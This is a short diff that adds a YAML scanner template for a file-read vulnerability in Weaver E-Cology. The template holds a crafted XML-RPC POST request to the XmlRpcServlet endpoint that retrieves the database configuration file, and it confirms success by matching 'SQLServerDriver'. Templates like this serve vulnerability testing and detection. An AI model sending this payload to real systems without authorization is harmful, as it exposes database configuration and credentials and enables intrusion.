@@ -1,0 +1,24 @@
+name: 泛微E-Cology-XmlRpcServlet文件读取
+description: >
+  读取数据库配置文件
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /weaver/org.apache.xmlrpc.webserver.XmlRpcServlet
+    headers:
+      Content-Type: application/xml
+    body: |
+        <?xml version="1.0" encoding="UTF-8"?>
+        <methodCall>
+        <methodName>WorkflowService.LoadTemplateProp</methodName>
+        <params>
+        <param>
+        <value><string>weaver</string></value>
+        </param>
+        </params>
+        </methodCall>
+    expression:
+      status: 200
+      body_all:
+        - "SQLServerDriver"
